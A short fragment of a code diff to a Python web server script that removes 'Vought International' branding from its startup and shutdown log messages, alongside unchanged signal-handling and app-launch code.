-        logger.info("Received shutdown signal - Vought International signing off")
+        logger.info("Received shutdown signal")
         try:
             future = asyncio.run_coroutine_threadsafe(shutdown(), main_loop)
             future.result(timeout=10)
@@ -919,5 +537,5 @@ if __name__ == '__main__':
     signal.signal(signal.SIGINT, handle_shutdown)
 
     port = int(os.environ.get('PORT', 8080))
-    logger.info(f"Vought International server starting on port {port}")
+    logger.info(f"Server starting on port {port}")
     app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
